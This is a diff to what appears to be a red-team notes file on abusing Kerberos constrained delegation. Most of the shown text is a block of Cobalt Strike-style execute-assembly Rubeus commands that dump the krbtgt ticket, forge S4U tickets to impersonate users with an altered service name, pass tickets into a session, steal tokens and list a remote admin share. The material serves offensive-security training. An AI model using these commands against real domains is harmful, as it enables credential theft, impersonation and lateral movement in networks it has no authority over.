@@ -33,13 +33,11 @@ steal_token 4652
 constrained delegation takes it a step further by allowing you to configure which services an account can be delegated to.it limits delegation to a specified list, rather than allowing delegation to any service as in unconstrained delegation.
 ```
 execute-assembly C:\Users\Public\Rubeus.exe triage
-execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt
-execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:JOHN-PC$ /msdsspn:cifs/John-PC.acmebank.local /ticket:
-execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:n.glover /msdsspn:cifs/fs-1.insomnia.co.mm /ticket:[...snip...]
+execute-assembly C:\Users\Public\Rubeus.exe dump /service:krbtgt /nowrap
+execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:MeMe /msdsspn:cifs/fs-1.insomnia.io /ticket: /nowrap
 execute-assembly C:\Users\Public\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe
-execute-assembly C:\Users\Public\Rubeus.exe ptt /luid:0x239b995 /ticket:[...snip...]
-steal_token 3420
-ls \\fs-1.insomnia.co.mm\c$
+execute-assembly C:\Users\Public\Rubeus.exe s4u /impersonateuser:hjensen /msdsspn:time/srv-2.child.redteamops.local /altservice:cifs /ticket:
+execute-assembly C:\Users\Public\Rubeus.exe ptt /ticket: /luid:0x239b995
 ```
 ### Resource-based Constrained Delegation
 service administrators/owners can configure which domain accounts are allowed to delegate to them.
